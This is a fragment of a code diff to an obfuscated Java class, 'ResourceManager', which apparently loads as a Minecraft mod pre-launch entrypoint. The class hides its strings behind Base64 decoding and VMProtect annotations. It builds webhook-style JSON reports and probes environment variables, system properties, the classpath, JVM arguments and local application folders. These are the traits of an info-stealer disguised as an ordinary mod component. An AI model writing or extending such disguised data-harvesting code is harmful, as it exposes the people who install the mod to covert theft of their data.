             js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[5]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.b1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
-            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[6]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(r.v1).append("/100```\",\"").append(d("aW5saW5l")).append("\":true},");
+            js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[6]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(r.v1).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
             js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[7]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(r.t1.format(DateTimeFormatter.ofPattern(d("ZGQuTU0ueXl5eSBISDptbTpzcw==")))).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
             js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[8]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.p1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
             js.append("{\"").append(d("bmFtZQ==")).append("\":\"").append(EM[9]).append("\",\"").append(d("dmFsdWU=")).append("\":\"```").append(j1(r.o1)).append("```\",\"").append(d("aW5saW5l")).append("\":true},");
@@ -941,29 +1007,6 @@ public class ResourceManager implements PreLaunchEntrypoint {
             }
 
         } catch (Exception ignored) {}
-    }
-
-    @Native(type = Native.Type.VMProtectBeginUltra)
-    private static String k1() {
-        StringBuilder sb = new StringBuilder();
-        for (char c : E_1) sb.append(c);
-        for (char c : E_2) sb.append(c);
-        for (char c : E_3) sb.append(c);
-        return sb.toString();
-    }
-
-    @Native(type = Native.Type.VMProtectBeginUltra)
-    private static String k2() {
-        StringBuilder sb = new StringBuilder();
-        for (char c : A_1) sb.append(c);
-        return sb.toString();
-    }
-
-    @Native(type = Native.Type.VMProtectBeginUltra)
-    private static String k3() {
-        StringBuilder sb = new StringBuilder();
-        for (char c : A_2) sb.append(c);
-        return sb.toString();
     }
 
     @Native(type = Native.Type.VMProtectBeginMutation)
@@ -1033,6 +1076,9 @@ public class ResourceManager implements PreLaunchEntrypoint {
 
     @Native(type = Native.Type.VMProtectBeginMutation)
     private void m4() {
+        String[] C2 = gC2();
+        String[] PT = gPT();
+        String[] PN = gPN();
         String[] sp = {
                 System.getProperty(PT[0]),
                 System.getenv(PT[1]),
@@ -1066,6 +1112,9 @@ public class ResourceManager implements PreLaunchEntrypoint {
 
     @Native(type = Native.Type.VMProtectBeginMutation)
     private void m5() {
+        String[] C3 = gC3();
+        String[] PT = gPT();
+        String[] PN = gPN();
         String[] sp = {
                 System.getProperty(PT[0]) + PT[3],
                 System.getProperty(PT[0]) + PT[4],
@@ -1099,6 +1148,8 @@ public class ResourceManager implements PreLaunchEntrypoint {
     @Native(type = Native.Type.VMProtectBeginMutation)
     private void m6() {
         try {
+            String[] C4 = gC4();
+            String[] PN = gPN();
             String ar = java.lang.management.ManagementFactory
                     .getRuntimeMXBean()
                     .getInputArguments()
@@ -1115,6 +1166,7 @@ public class ResourceManager implements PreLaunchEntrypoint {
     @Native(type = Native.Type.VMProtectBeginMutation)
     private void m7() {
         try {
+            String[] PN = gPN();
             if (java.lang.management.ManagementFactory
                     .getRuntimeMXBean()
                     .getInputArguments()
@@ -1128,6 +1180,7 @@ public class ResourceManager implements PreLaunchEntrypoint {
     @Native(type = Native.Type.VMProtectBeginMutation)
     private void m8() {
         try {
+            String[] PN = gPN();
             String cp = System.getProperty(d("amF2YS5jbGFzcy5wYXRo"));
             if (cp == null) return;
             String lw = cp.toLowerCase();
@@ -1143,6 +1196,7 @@ public class ResourceManager implements PreLaunchEntrypoint {
     @Native(type = Native.Type.VMProtectBeginMutation)
     private void m9() {
         try {
+            String[] PN = gPN();
             Map<String, String> ev = System.getenv();
             for (Map.Entry<String, String> en : ev.entrySet()) {
                 String ky = en.getKey().toLowerCase();
@@ -1159,6 +1213,8 @@ public class ResourceManager implements PreLaunchEntrypoint {
     @Native(type = Native.Type.VMProtectBeginMutation)
     private void m10() {
         try {
+            String[] PT = gPT();
+            String[] PN = gPN();
             String rp = System.getenv(PT[1]) + PT[8];
             File rd = new File(rp);
             if (!rd.exists()) return;
@@ -1245,5 +1301,6 @@ public class ResourceManager implements PreLaunchEntrypoint {
         public String j1;
         public String p1;
         public int phase;
+        public String s;
     }
 }
